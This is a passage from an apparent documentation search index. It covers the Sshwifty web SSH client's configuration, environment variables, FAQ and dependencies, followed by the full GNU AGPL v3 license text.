Encoding field. Valid data is those displayed on\n        // the page\n        \"Encoding\": \"utf-8\"\n        ....\n      }\n    },\n    ....\n  ],\n\n  // Allow the Preset Remotes only, and refuse to connect to any other remote\n  // host\n  //\n  // NOTICE: You can only configure OnlyAllowPresetRemotes through a config\n  //         file. This option is not supported when you are configuring with\n  //         environment variables\n  OnlyAllowPresetRemotes: false\n}\n</code></pre> <p><code>sshwifty.conf.example.json</code> is an example of a valid configuration file.</p>"},{"location":"Sshwifty/sshwifty/#environment-variables","title":"Environment variables","text":"<p>Valid environment variables are:</p> <pre><code>SSHWIFTY_HOSTNAME\nSSHWIFTY_SHAREDKEY\nSSHWIFTY_DIALTIMEOUT\nSSHWIFTY_SOCKS5\nSSHWIFTY_SOCKS5_USER\nSSHWIFTY_SOCKS5_PASSWORD\nSSHWIFTY_LISTENPORT\nSSHWIFTY_INITIALTIMEOUT\nSSHWIFTY_READTIMEOUT\nSSHWIFTY_WRITETIMEOUT\nSSHWIFTY_HEARTBEATTIMEOUT\nSSHWIFTY_READDELAY\nSSHWIFTY_WRITEELAY\nSSHWIFTY_LISTENINTERFACE\nSSHWIFTY_TLSCERTIFICATEFILE\nSSHWIFTY_TLSCERTIFICATEKEYFILE\nSSHWIFTY_PRESETS\nSSHWIFTY_ONLYALLOWPRESETREMOTES\n</code></pre> <p>The options they represent correspond to their counterparts in the configuration file.</p> <p>Notice: When you're using environment variables to configure Sshwifty, only one Sshwifty HTTP server is then allowed. There is no way to setup mulitple servers under this method of configuration. If you need to serve on multiple ports, use the configuration file instead.</p> <p>Be aware: An invalid value inside following environment variables will cause the value to be sliently reset to default during configuration parsing phase without warning:</p> <pre><code>SSHWIFTY_DIALTIMEOUT\nSSHWIFTY_INITIALTIMEOUT\nSSHWIFTY_READTIMEOUT\nSSHWIFTY_WRITETIMEOUT\nSSHWIFTY_HEARTBEATTIMEOUT\nSSHWIFTY_READDELAY\nSSHWIFTY_WRITEELAY\n</code></pre>"},{"location":"Sshwifty/sshwifty/#faq","title":"FAQ","text":""},{"location":"Sshwifty/sshwifty/#why-the-software-says-the-time-difference-is-beyond-operational-limit","title":"Why the software says \"The time difference is beyond operational limit\"?","text":"<p>This usually happens when the clock on the client and/or the server is unsynced beyond tolerance.</p> <p>Please make sure the clock time on both the client and the server are correct by resync them with a NTP server, and then reload the page. The problem should be gone afterwards.</p>"},{"location":"Sshwifty/sshwifty/#why-i-got-error-typeerror-cannot-read-property-importkey-of-undefined","title":"Why I got error \"TypeError: Cannot read property 'importKey' of undefined\"","text":"<p>It's usually because your web browser does not support WebCrypt API (such as <code>window.crypto.subtle</code> or anything under <code>window.crypto</code>), or the support has been disabled.</p> <p>If you're using Google Chrome, please connect Sshwifty with HTTPS. Chrome will disable WebCrypt and many other APIs when the connection is not safe.</p>"},{"location":"Sshwifty/sshwifty/#can-i-serve-sshwifty-under-a-subpath-such-as-httpsmydomainssh","title":"Can I serve Sshwifty under a subpath such as <code>https://my.domain/ssh</code>?","text":"<p>The short story is NO. Sshwifty was designed based on an assumption that it will run as the only service under a given hostname, allowing web browsers to better enforce their data isolation rules. This is very important because Sshwifty saves user data locally.</p> <p>However, if you really want to put Sshwifty into a subpath, you can do so by taking advantage of the fact that Sshwifty backend interface and assets are always located under an URL prefix <code>/sshwifty</code>. You can thus redirect or proxy those requests to their new location.</p> <p>Keep in mind, doing so is really hacky, and it's not recommended by the author thus no support will be provided if you decide to go with that.</p>"},{"location":"Sshwifty/sshwifty/#why-i-cant-add-my-own-key-combinations-to-the-console-tool-bar","title":"Why I can't add my own key combinations to the Console tool bar?","text":"<p>The pre-defined key combinations are there mainly to make mobile operation possible as well as to resolve some hotkey conflicts. However, if efficiency is your first goal, please consider to use a software/on screen keyboard which is specially designed for terminal.</p> <p>And if that's not enough, connect a physical keyboard through Bluetooth or OTA could be a better alternative. This way you can type as if you're using a computer console.</p>"},{"location":"Sshwifty/sshwifty/#credits","title":"Credits","text":"<ul> <li>Thanks to Ryan Fortner for the grammar fix</li> <li>Thanks to Tweak for the grammer fix too</li> </ul>"},{"location":"Sshwifty/sshwifty/#license","title":"License","text":"<p>Code of this project is licensed under AGPL, see LICENSE.md for detail.</p> <p>Third-party components used by this project are licensed under their respective licenses. See DEPENDENCIES.md to learn more about dependencies used by this project and read their copyright statements.</p>"},{"location":"Sshwifty/sshwifty/#contribute","title":"Contribute","text":"<p>This is a hobbyist project, meaning I don't have too many time to put into it. Sorry.</p> <p>Upon release (Which is then you're able to read this file), this project will enter maintaining state, which includes doing bug fix and security updates. Adding new features however, is not a part of the state.</p> <p>Please do not send any pull requests. If you need new feature, fork it, add it by yourself, and maintain it like one of your own project.</p> <p>(Notice: Typo, grammar error or invalid use of language in the source code and document is categorized as bug, please report them if you found any. Thank you!)</p> <p>Appreciate your help!</p> <p>Enjoy!</p>"},{"location":"Sshwifty/sshwifty/DEPENDENCIES/","title":"Dependencies used by Sshwifty","text":"<p>Sshwifty uses many third-party components. Those components is required in order for Sshwifty to function.</p> <p>A list of used components can be found inside <code>package.json</code> and <code>go.mod</code> file.</p> <p>Major dependencies includes:</p>"},{"location":"Sshwifty/sshwifty/DEPENDENCIES/#for-front-end-application","title":"For front-end application","text":"<ul> <li>Vue, Licensed under MIT license</li> <li>Babel, Licensed under MIT license</li> <li>XTerm.js, Licensed under MIT license</li> <li>normalize.css, Licensed under MIT license</li> <li>Roboto font, Licensed under Apache license   Packaged by Christian Hoffmeister, Licensed under Apache 2.0</li> <li>iconv-lite, Licensed under MIT license</li> <li>buffer, Licensed under MIT license</li> <li>fontfaceobserver, View license</li> <li>Hack Font, View license</li> <li>Nerd Fonts, packaged by @azurity/pure-nerd-font   includes icons from following fonts:</li> <li>Powerline Extra Symbols, Licensed under MIT license</li> <li>Font Awesome, View license</li> <li>Font Awesome Extension, Licensed under MIT license</li> <li>Material Design Icons, View license</li> <li>Weather Icons, Licensed under SIL OFL 1.1</li> <li>Devicons, Licensed under MIT license</li> <li>Octicons, Licensed under MIT license</li> <li>Codicons, Licensed under MIT License</li> <li>Font Logos (Formerly Font Linux), Licensed under Unlicense license </li> <li>Pomicons, Licensed under OFL-1.1 license</li> <li>... and more, see full list</li> </ul>"},{"location":"Sshwifty/sshwifty/DEPENDENCIES/#for-back-end-application","title":"For back-end application","text":"<ul> <li>Go programming language, View license</li> <li><code>github.com/gorilla/websocket</code>, Licensed under BSD-2-Cause license</li> <li><code>golang.org/x/net/proxy</code> View license</li> <li><code>golang.org/x/crypto</code>, View license</li> </ul>"},{"location":"Sshwifty/sshwifty/LICENSE/","title":"LICENSE","text":""},{"location":"Sshwifty/sshwifty/LICENSE/#gnu-affero-general-public-license","title":"GNU AFFERO GENERAL PUBLIC LICENSE","text":"<p>Version 3, 19 November 2007</p> <p>Copyright (C) 2007 Free Software Foundation, Inc. https://fsf.org/</p> <p>Everyone is permitted to copy and distribute verbatim copies of this license document, but changing it is not allowed.</p>"},{"location":"Sshwifty/sshwifty/LICENSE/#preamble","title":"Preamble","text":"<p>The GNU Affero General Public License is a free, copyleft license for software and other kinds of works, specifically designed to ensure cooperation with the community in the case of network server software.</p> <p>The licenses for most software and other practical works are designed to take away your freedom to share and change the works. By contrast, our General Public Licenses are intended to guarantee your freedom to share and change all versions of a program--to make sure it remains free software for all its users.</p> <p>When we speak of free software, we are referring to freedom, not price. Our General Public Licenses are designed to make sure that you have the freedom to distribute copies of free software (and charge for them if you wish), that you receive source code or can get it if you want it, that you can change the software or use pieces of it in new free programs, and that you know you can do these things.</p> <p>Developers that use our General Public Licenses protect your rights with two steps: (1) assert copyright on the software, and (2) offer you this License which gives you legal permission to copy, distribute and/or modify the software.</p> <p>A secondary benefit of defending all users' freedom is that improvements made in alternate versions of the program, if they receive widespread use, become available for other developers to incorporate. Many developers of free software are heartened and encouraged by the resulting cooperation. However, in the case of software used on network servers, this result may fail to come about. The GNU General Public License permits making a modified version and letting the public access it on a server without ever releasing its source code to the public.</p> <p>The GNU Affero General Public License is designed specifically to ensure that, in such cases, the modified source code becomes available to the community. It requires the operator of a network server to provide the source code of the modified version running there to the users of that server. Therefore, public use of a modified version, on a publicly accessible server, gives the public access to the source code of the modified version.</p> <p>An older license, called the Affero General Public License and published by Affero, was designed to accomplish similar goals. This is a different license, not a version of the Affero GPL, but Affero has released a new version of the Affero GPL which permits relicensing under this license.</p> <p>The precise terms and conditions for copying, distribution and modification follow.</p>"},{"location":"Sshwifty/sshwifty/LICENSE/#terms-and-conditions","title":"TERMS AND CONDITIONS","text":""},{"location":"Sshwifty/sshwifty/LICENSE/#0-definitions","title":"0. Definitions.","text":"<p>\"This License\" refers to version 3 of the GNU Affero General Public License.</p> <p>\"Copyright\" also means copyright-like laws that apply to other kinds of works, such as semiconductor masks.</p> <p>\"The Program\" refers to any copyrightable work licensed under this License. Each licensee is addressed as \"you\". \"Licensees\" and \"recipients\" may be individuals or organizations.</p> <p>To \"modify\" a work means to copy from or adapt all or part of the work in a fashion requiring copyright permission, other than the making of an exact copy. The resulting work is called a \"modified version\" of the earlier work or a work \"based on\" the earlier work.</p> <p>A \"covered work\" means either the unmodified Program or a work based on the Program.</p> <p>To \"propagate\" a work means to do anything with it that, without permission, would make you directly or secondarily liable for infringement under applicable copyright law, except executing it on a computer or modifying a private copy. Propagation includes copying, distribution (with or without modification), making available to the public, and in some countries other activities as well.</p> <p>To \"convey\" a work means any kind of propagation that enables other parties to make or receive copies. Mere interaction with a user through a computer network, with no transfer of a copy, is not conveying.</p> <p>An interactive user interface displays \"Appropriate Legal Notices\" to the extent that it includes a convenient and prominently visible feature that (1) displays an appropriate copyright notice, and (2) tells the user that there is no warranty for the work (except to the extent that warranties are provided), that licensees may convey the work under this License, and how to view a copy of this License. If the interface presents a list of user commands or options, such as a menu, a prominent item in the list meets this criterion.</p>"},{"location":"Sshwifty/sshwifty/LICENSE/#1-source-code","title":"1. Source Code.","text":"<p>The \"source code\" for a work means the preferred form of the work for making modifications to it. \"Object code\" means any non-source form of a work.</p> <p>A \"Standard Interface\" means an interface that either is an official standard defined by a recognized standards body, or, in the case of interfaces specified for a particular programming language, one that is widely used among developers working in that language.</p> <p>The \"System Libraries\" of an executable work include anything, other than the work as a whole, that (a) is included in the normal form of packaging a Major Component, but which is not part of that Major Component, and (b) serves only to enable use of the work with that Major Component, or to implement a Standard Interface for which an implementation is available to the public in source code form. A \"Major Component\", in this context, means a major essential component (kernel, window system, and so on) of the specific operating system (if any) on which the executable work runs, or a compiler used to produce the work, or an object code interpreter used to run it.</p> <p>The \"Corresponding Source\" for a work in object code form means all the source code needed to generate, install, and (for an executable work) run the object code and to modify the work, including scripts to control those activities. However, it does not include the work's System Libraries, or general-purpose tools or generally available free programs which are used unmodified in performing those activities but which are not part of the work. For example, Corresponding Source includes interface definition files associated with source files for the work, and the source code for shared libraries and dynamically linked subprograms that the work is specifically designed to require, such as by intimate data communication or control flow between those subprograms and other parts of the work.</p> <p>The Corresponding Source need not include anything that users can regenerate automatically from other parts of the Corresponding Source.</p> <p>The Corresponding Source for a work in source code form is that same work.</p>"},{"location":"Sshwifty/sshwifty/LICENSE/#2-basic-permissions","title":"2. Basic Permissions.","text":"<p>All rights granted under this License are granted for the term of copyright on the Program, and are irrevocable provided the stated conditions are met. This License explicitly affirms your unlimited permission to run the unmodified Program. The output from running a covered work is covered by this License only if the output, given its content, constitutes a covered work. This License acknowledges your rights of fair use or other equivalent, as provided by copyright law.</p> <p>You may make, run and propagate covered works that you do not convey, without conditions so long as your license otherwise remains in force. You may convey covered works to others for the sole purpose of having them make modifications exclusively for you, or provide you with facilities for running those works, provided that you comply with the terms of this License in conveying all material for which you do not control copyright. Those thus making or running the covered works for you must do so exclusively on your behalf, under your direction and control, on terms that prohibit them from making any copies of your copyrighted material outside their relationship with you.</p> <p>Conveying under any other circumstances is permitted solely under the conditions stated below. Sublicensing is not allowed; section 10 makes it unnecessary.</p>"},{"location":"Sshwifty/sshwifty/LICENSE/#3-protecting-users-legal-rights-from-anti-circumvention-law","title":"3. Protecting Users' Legal Rights From Anti-Circumvention Law.","text":"<p>No covered work shall be deemed part of an effective technological measure under any applicable law fulfilling obligations under article 11 of the WIPO copyright treaty adopted on 20 December 1996, or similar laws prohibiting or restricting circumvention of such measures.</p> <p>When you convey a covered work, you waive any legal power to forbid circumvention of technological measures to the extent such circumvention is effected by exercising rights under this License with respect to the covered work, and you disclaim any intention to limit operation or modification of the work as a means of enforcing, against the work's users, your or third parties' legal rights to forbid circumvention of technological measures.</p>"},{"location":"Sshwifty/sshwifty/LICENSE/#4-conveying-verbatim-copies","title":"4. Conveying Verbatim Copies.","text":"<p>You may convey verbatim copies of the Program's source code as you receive it, in any medium, provided that you conspicuously and appropriately publish on each copy an appropriate copyright notice; keep intact all notices stating that this License and any non-permissive terms added in accord with section 7 apply to the code; keep intact all notices of the absence of any warranty; and give all recipients a copy of this License along with the Program.</p> <p>You may charge any price or no price for each copy that you convey, and you may offer support or warranty protection for a fee.</p>"},{"location":"Sshwifty/sshwifty/LICENSE/#5-conveying-modified-source-versions","title":"5. Conveying Modified Source Versions.","text":"<p>You may convey a work based on the Program, or the modifications to produce it from the Program, in the form of source code under the terms of section 4, provided that you also meet all of these conditions:</p> <ul> <li>a) The work must carry prominent notices stating that you modified     it, and giving a relevant date.</li> <li>b) The work must carry prominent notices stating that it is     released under this License and any conditions added under     section 7. This requirement modifies the requirement in section 4     to \"keep intact all notices\".</li> <li>c) You must license the entire work, as a whole, under this     License to anyone who comes into possession of a copy. This     License will therefore apply, along with any applicable section 7     additional terms, to the whole of the work, and all its parts,     regardless of how they are packaged. This License gives no     permission to license the work in any other way, but it does not     invalidate such permission if you have separately received it.</li> <li>d) If the work has interactive user interfaces, each must display     Appropriate Legal Notices; however, if the Program has interactive     interfaces that do not display Appropriate Legal Notices, your     work need not make them do so.</li> </ul> <p>A compilation of a covered work with other separate and independent works, which are not by their nature extensions of the covered work, and which are not combined with it such as to form a larger program, in or on a volume of a storage or distribution medium, is called an \"aggregate\" if the compilation and its resulting copyright are not used to limit the access or legal rights of the compilation's users beyond what the individual works permit. Inclusion of a covered work in an aggregate does not cause this License to apply to the other parts of the aggregate.</p>"},{"location":"Sshwifty/sshwifty/LICENSE/#6-conveying-non-source-forms","title":"6. Conveying Non-Source Forms.","text":"<p>You may convey a covered work in object code form under the terms of sections 4 and 5, provided that you also convey the machine-readable Corresponding Source under the terms of this License, in one of these ways:</p> <ul> <li>a) Convey the object code in, or embodied in, a physical product     (including a physical distribution medium), accompanied by the     Corresponding Source fixed on a durable physical medium     customarily used for software interchange.</li> <li>b) Convey the object code in, or embodied in, a physical product     (including a physical distribution medium), accompanied by a     written offer, valid for at least three years and valid for as     long as you offer spare parts or customer support for that product     model, to give anyone who possesses the object code either (1) a     copy of the Corresponding Source for all the software in the     product that is covered by this License, on a durable physical     medium customarily used for software interchange, for a price no     more than your reasonable cost of physically performing this     conveying of source, or (2) access to copy the Corresponding     Source from a network server at no charge.</li> <li>c) Convey individual copies of the object code with a copy of the     written offer to provide the Corresponding Source. This     alternative is allowed only occasionally and noncommercially, and     only if you received the object code with such an offer, in accord     with subsection 6b.</li> <li>d) Convey the object code by offering access from a designated     place (gratis or for a charge), and offer equivalent access to the     Corresponding Source in the same way through the same place at no     further charge. You need not require recipients to copy the     Corresponding Source along with the object code. If the place to     copy the object code is a network server, the Corresponding Source     may be on a different server (operated by you or a third party)     that supports equivalent copying facilities, provided you maintain     clear directions next to the object code saying where to find the     Corresponding Source. Regardless of what server hosts the     Corresponding Source, you remain obligated to ensure that it is     available for as long as needed to satisfy these requirements.</li> <li>e) Convey the object code using peer-to-peer transmission,     provided you inform other peers where the object code and     Corresponding Source of the work are being offered to the general     public at no charge under subsection 6d.</li> </ul> <p>A separable portion of the object code, whose source code is excluded from the Corresponding Source as a System Library, need not be included in conveying the object code work.</p> <p>A \"User Product\" is either (1) a \"consumer product\", which means any tangible personal property which is normally used for personal, family, or household purposes, or (2) anything designed or sold for incorporation into a dwelling. In determining whether a product is a consumer product, doubtful cases shall be resolved in favor of coverage. For a particular product received by a particular user, \"normally used\" refers to a typical or common use of that class of product, regardless of the status of the particular user or of the way in which the particular user actually uses, or expects or is expected to use, the product. A product is a consumer product regardless of whether the product has substantial commercial, industrial or non-consumer uses, unless such uses represent the only significant mode of use of the product.</p> <p>\"Installation Information\" for a User Product means any methods, procedures, authorization keys, or other information required to install and execute modified versions of a covered work in that User Product from a modified version of its Corresponding Source. The information must suffice to ensure that the continued functioning of the modified object code is in no case prevented or interfered with solely because modification has been made.</p> <p>If you convey an object code work under this section in, or with, or specifically for use in, a User Product, and the conveying occurs as part of a transaction in which the right of possession and use of the User Product is transferred to the recipient in perpetuity or for a fixed term (regardless of how the transaction is characterized), the Corresponding Source conveyed under this section must be accompanied by the Installation Information. But this requirement does not apply if neither you nor any third party retains the ability to install modified object code on the User Product (for example, the work has been installed in ROM).</p> <p>The requirement to provide Installation Information does not include a requirement to continue to provide support service, warranty, or updates for a work that has been modified or installed by the recipient, or for the User Product in which it has been modified or installed. Access to a network may be denied when the modification itself materially and adversely affects the operation of the network or violates the rules and protocols for communication across the network.</p> <p>Corresponding Source conveyed, and Installation Information provided, in accord with this section must be in a format that is publicly documented (and with an implementation available to the public in source code form), and must require no special password or key for unpacking, reading or copying.</p>"},{"location":"Sshwifty/sshwifty/LICENSE/#7-additional-terms","title":"7. Additional Terms.","text":"<p>\"Additional permissions\" are terms that supplement the terms of this License by making exceptions from one or more of its conditions. Additional permissions that are applicable to the entire Program shall be treated as though they were included in this License, to the extent that they are valid under applicable law. If additional permissions apply only to part of the Program, that part may be used separately under those permissions, but the entire Program remains governed by this License without regard to the additional permissions.</p> <p>When you convey a copy of a covered work, you may at your option remove any additional permissions from that copy, or from any part of it. (Additional permissions may be written to require their own removal in certain cases when you modify the work.) You may place additional permissions on material, added by you to a covered work, for which you have or can give appropriate copyright permission.</p> <p>Notwithstanding any other provision of this License, for material you add to a covered work, you may (if authorized by the copyright holders of that material) supplement the terms of this License with terms:</p> <ul> <li>a) Disclaiming warranty or limiting liability differently from the     terms of sections 15 and 16 of this License; or</li> <li>b) Requiring preservation of specified reasonable legal notices or     author attributions in that material or in the Appropriate Legal     Notices displayed by works containing it; or</li> <li>c) Prohibiting misrepresentation of the origin of that material,     or requiring that modified versions of such material be marked in     reasonable ways as different from the original version; or</li> <li>d) Limiting the use for publicity purposes of names of licensors     or authors of the material; or</li> <li>e) Declining to grant rights under trademark law for use of some     trade names, trademarks, or service marks; or</li> <li>f) Requiring indemnification of licensors and authors of that     material by anyone who conveys the material (or modified versions     of it) with contractual assumptions of liability to the recipient,     for any liability that these contractual assumptions directly     impose on those licensors and authors.</li> </ul> <p>All other non-permissive additional terms are considered \"further restrictions\" within the meaning of section 10. If the Program as you received it, or any part of it, contains a notice stating that it is governed by this License along with a term that is a further restriction, you may remove that term. If a license document contains a further restriction but permits relicensing or conveying under this License, you may add to a covered work material governed by the terms of that license document, provided that the further restriction does not survive such relicensing or conveying.</p> <p>If you add terms to a covered work in accord with this section, you must place, in the relevant source files, a statement of the additional terms that apply to those files, or a notice indicating where to find the applicable terms.</p> <p>Additional terms, permissive or non-permissive, may be stated in the form of a separately written license, or stated as exceptions; the above requirements apply either way.</p>"},{"location":"Sshwifty/sshwifty/LICENSE/#8-termination","title":"8. Termination.","text":"<p>You may not propagate or modify a covered work except as expressly provided under this License. Any attempt otherwise to propagate or modify it is void, and will automatically terminate your rights under this License (including any patent licenses granted under the third paragraph of section 11).</p> <p>However, if you cease all violation of this License, then your license from a particular copyright holder is reinstated (a) provisionally, unless and until the copyright holder explicitly and finally terminates your license, and (b) permanently, if the copyright holder fails to notify you of the violation by some reasonable means prior to 60 days after the cessation.</p> <p>Moreover, your license from a particular copyright holder is reinstated permanently if the copyright holder notifies you of the violation by some reasonable means, this is the first time you have received notice of violation of this License (for any work) from that copyright holder, and you cure the violation prior to 30 days after your receipt of the notice.</p> <p>Termination of your rights under this section does not terminate the licenses of parties who have received copies or rights from you under this License. If your rights have been terminated and not permanently reinstated, you do not qualify to receive new licenses for the same material under section 10.</p>"},{"location":"Sshwifty/sshwifty/LICENSE/#9-acceptance-not-required-for-having-copies","title":"9. Acceptance Not Required for Having Copies.","text":"<p>You are not required to accept this License in order to receive or run a copy of the Program. Ancillary propagation of a covered work occurring solely as a consequence of using peer-to-peer transmission to receive a copy likewise does not require acceptance. However, nothing other than this License grants you permission to propagate or modify any covered work. These actions infringe copyright if you do not accept this License. Therefore, by modifying or propagating a covered work, you indicate your acceptance of this License to do so.</p>"},{"location":"Sshwifty/sshwifty/LICENSE/#10-automatic-licensing-of-downstream-recipients","title":"10. Automatic Licensing of Downstream Recipients.","text":"<p>Each time you convey a covered work, the recipient automatically receives a license from the original licensors, to run, modify and propagate that work, subject to this License. You are not responsible for enforcing compliance by third parties with this License.</p> <p>An \"entity transaction\" is a transaction transferring control of an organization, or substantially all assets of one, or subdividing an organization, or merging organizations. If propagation of a covered work results from an entity transaction, each party to that transaction who receives a copy of the work also receives whatever licenses to the work the party's predecessor in interest had or could give under the previous paragraph, plus a right to possession of the Corresponding Source of the work from the predecessor in interest, if the predecessor has it or can get it with reasonable efforts.</p> <p>You may not impose any further restrictions on the exercise of the rights granted or affirmed under this License. For example, you may not impose a license fee, royalty, or other charge for exercise of rights granted under this License, and you may not initiate litigation (including a cross-claim or counterclaim in a lawsuit) alleging that any patent claim is infringed by making, using, selling, offering for sale, or importing the Program or any portion of it.</p>"},{"location":"Sshwifty/sshwifty/LICENSE/#11-patents","title":"11. Patents.","text":"<p>A \"contributor\" is a copyright holder who authorizes use under this License of the Program or a work on which the Program is based. The work thus licensed is called the contributor's \"contributor version\".</p> <p>A contributor's \"essential patent claims\" are all patent claims owned or controlled by the contributor, whether already acquired or hereafter acquired, that would be infringed by some manner, permitted by this License, of making, using, or selling its contributor version, but do not include claims that would be infringed only as a consequence of further modification of the contributor version. For purposes of this definition, \"control\" includes the right to grant patent sublicenses in a manner consistent with the requirements of this License.</p> <p>Each contributor grants you a non-exclusive, worldwide, royalty-free patent license under the contributor's essential patent claims, to make, use, sell, offer for sale, import and otherwise run, modify and propagate the contents of its contributor version.</p> <p>In the following three paragraphs, a \"patent license\" is any express agreement or commitment, however denominated, not to enforce a patent (such as an express permission to practice a patent or covenant not to sue for patent infringement). To \"grant\" such a patent license to a party means to make such an agreement or commitment not to enforce a patent against the party.</p> <p>If you convey a covered work, knowingly relying on a patent license, and the Corresponding Source of the work is not available for anyone to copy, free of charge and under the terms of this License, through a publicly available network server or other readily accessible means, then you must either (1) cause the Corresponding Source to be so available, or (2) arrange to deprive yourself of the benefit of the patent license for this particular work, or (3) arrange, in a manner consistent with the requirements of this License, to extend the patent license to downstream recipients. \"Knowingly relying\" means you have actual knowledge that, but for the patent license, your conveying the covered work in a country, or your recipient's use of the covered work in a country, would infringe one or more identifiable patents in that country that you have reason to believe are valid.</p> <p>If, pursuant to or in connection with a single transaction or arrangement, you convey, or propagate by procuring conveyance of, a covered work, and grant a patent license to some of the parties receiving the covered work authorizing them to use, propagate, modify or convey a specific copy of the covered work, then the patent license you grant is automatically extended to all recipients of the covered work and works based on it.</p> <p>A patent license is \"discriminatory\" if it does not include within the scope of its coverage, prohibits the exercise of, or is conditioned on the non-exercise of one or more of the rights that are specifically granted under this License. You may not convey a covered work if you are a party to an arrangement with a third party that is in the business of distributing software, under which you make payment to the third party based on the extent of your activity of conveying the work, and under which the third party grants, to any of the parties who would receive the covered work from you, a discriminatory patent license (a) in connection with copies of the covered work conveyed by you (or copies made from those copies), or (b) primarily for and in connection with specific products or compilations that contain the covered work, unless you entered into that arrangement, or that patent license was granted, prior to 28 March 2007.</p> <p>Nothing in this License shall be construed as excluding or limiting any implied license or other defenses to infringement that may otherwise be available to you under applicable patent law.</p>"},{"location":"Sshwifty/sshwifty/LICENSE/#12-no-surrender-of-others-freedom","title":"12. No Surrender of Others' Freedom.","text":"<p>If conditions are imposed on you (whether by court order, agreement or otherwise) that contradict the conditions of this License, they do not excuse you from the conditions of this License. If you cannot convey a covered work so as to satisfy simultaneously your obligations under this License and any other pertinent obligations, then as a consequence you may not convey it at all. For example, if you agree to terms that obligate you to collect a royalty for further conveying from those to whom you convey the Program, the only way you could satisfy both those terms and this License would be to refrain entirely from conveying the Program.</p>"},{"location":"Sshwifty/sshwifty/LICENSE/#13-remote-network-interaction-use-with-the-gnu-general-public-license","title":"13. Remote Network Interaction; Use with the GNU General Public License.","text":"<p>Notwithstanding any other provision of this License, if you modify the Program, your modified version must prominently offer all users interacting with it remotely through a computer network (if your version supports such interaction) an opportunity to receive the Corresponding Source of your version by providing access to the Corresponding Source from a network server at no charge, through some standard or customary means of facilitating copying of software. This Corresponding Source shall include the Corresponding Source for any work covered by version 3 of the GNU General Public License that is incorporated pursuant to the following paragraph.</p> <p>Notwithstanding any other provision of this License, you have permission to link or combine any covered work with a work licensed under version 3 of the GNU General Public License into a single combined work, and to convey the resulting work. The terms of this License will continue to apply to the part which is the covered work, but the work with which it is combined will remain governed by version 3 of the GNU General Public License.</p>"},{"location":"Sshwifty/sshwifty/LICENSE/#14-revised-versions-of-this-license","title":"14. Revised Versions of this License.","text":"<p>The Free Software Foundation may publish revised and/or new versions of the GNU Affero General Public License from time to time. Such new versions will be similar in spirit to the present version, but may differ in detail to address new problems or concerns.</p> <p>Each version is given a distinguishing version number. If the Program specifies that a certain numbered version of the GNU Affero General Public License \"or any later version\" applies to it, you have the option of following the terms and conditions either of that numbered version or of any later version published by the Free Software Foundation. If the Program does not specify a version number of the GNU Affero General Public License, you may choose any version ever published by the Free Software Foundation.</p> <p>If the Program specifies that a proxy can decide which future versions of the GNU Affero General Public License can be used, that proxy's public statement of acceptance of a version permanently authorizes you to choose that version for the Program.</p> <p>Later license versions may give you additional or different permissions. However, no additional obligations are imposed on any author or copyright holder as a result of your choosing to follow a later version.</p>"},{"location":"Sshwifty/sshwifty/LICENSE/#15-disclaimer-of-warranty","title":"15. Disclaimer of Warranty.","text":"<p>THERE IS NO WARRANTY FOR THE PROGRAM, TO THE EXTENT PERMITTED BY APPLICABLE LAW. EXCEPT WHEN OTHERWISE STATED IN WRITING THE COPYRIGHT HOLDERS AND/OR OTHER PARTIES PROVIDE THE PROGRAM \"AS IS\" WITHOUT WARRANTY OF ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE. THE ENTIRE RISK AS TO THE QUALITY AND PERFORMANCE OF THE PROGRAM IS WITH YOU. SHOULD THE PROGRAM PROVE DEFECTIVE, YOU ASSUME THE COST OF ALL NECESSARY SERVICING, REPAIR OR CORRECTION.</p>"},{"location":"Sshwifty/sshwifty/LICENSE/#16-limitation-of-liability","title":"16. Limitation of Liability.","text":"<p>IN NO EVENT UNLESS REQUIRED BY APPLICABLE LAW OR AGREED TO IN WRITING WILL ANY COPYRIGHT HOLDER, OR ANY OTHER PARTY WHO MODIFIES AND/OR CONVEYS THE PROGRAM AS PERMITTED ABOVE, BE LIABLE TO YOU FOR DAMAGES, INCLUDING ANY GENERAL, SPECIAL, INCIDENTAL OR CONSEQUENTIAL DAMAGES ARISING OUT OF THE USE OR INABILITY TO USE THE PROGRAM (INCLUDING BUT NOT LIMITED TO LOSS OF DATA OR DATA BEING RENDERED INACCURATE OR LOSSES SUSTAINED BY YOU OR THIRD PARTIES OR A FAILURE OF THE PROGRAM TO OPERATE WITH ANY OTHER PROGRAMS), EVEN IF SUCH HOLDER OR OTHER PARTY HAS BEEN ADVISED OF THE POSSIBILITY OF SUCH DAMAGES.</p>"},{"location":"Sshwifty/sshwifty/LICENSE/#17-interpretation-of-sections-15-and-16","title":"17. Interpretation of Sections 15 and 16.","text":"<p>If the disclaimer of warranty and limitation of liability provided above cannot be given local legal effect according to their terms, reviewing courts shall apply local law that most closely approximates an absolute waiver of all civil liability in connection with the Program, unless a warranty or assumption of liability accompanies a copy of the Program in return for a fee.</p> <p>END OF TERMS AND CONDITIONS</p>"},{"location":"Sshwifty/sshwifty/LICENSE/#how-to-apply-these-terms-to-your-new-programs","title":"How to Apply These Terms to Your New Programs","text":"<p>If you develop a new program, and you want it to be of the greatest possible use to the public, the best way to achieve this is to make it free software which everyone can redistribute and change under these terms.</p> <p>To do so, attach the following notices to the program. It is safest to attach them to the start of each source file to most effectively state the exclusion of warranty; and each file should have at least the \"copyright\" line and a pointer to where the full notice is found.</p> <pre><code>    &lt;one line to give the program's name and a brief idea of what it does.&gt;\n    Copyright (C) &lt;year&gt;  &lt;name of author&gt;\n\n    This program is free software: you can redistribute it and/or modify\n    it under the terms of the GNU Affero General Public License as\n    published by the Free Software Foundation, either version 3 of the\n    License, or (at your option) any later version.\n\n    This program is distributed in the hope that it will be useful,\n    but WITHOUT ANY WARRANTY; without even the implied warranty of\n    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n    GNU Affero General Public License for more details.\n\n    You should have received a copy of the GNU Affero General Public License\n    along with this program.  If not, see &lt;https://www.gnu.org/licenses/&gt;.\n</code></pre> <p>Also add information on how to contact you by electronic and paper mail.</p> <p>If your software can interact with users remotely through a computer network, you should also make sure that it provides a way for users to get its source. For example, if your program is a web application, its interface could display a \"Source\" link that leads users to an archive of the code. There are many ways you could offer source, and different solutions will be better for different programs; see section 13 for the specific requirements.</p> <p>You should also get your employer (if you work as a programmer) or school, if any, to sign a \"copyright disclaimer\" for the program, if necessary. For more information on this, and how to apply and follow the GNU AGPL, see https://www.gnu.org/licenses/.</p>"},{"location":"Terraform/Terraform_examples/","title":"Terraform 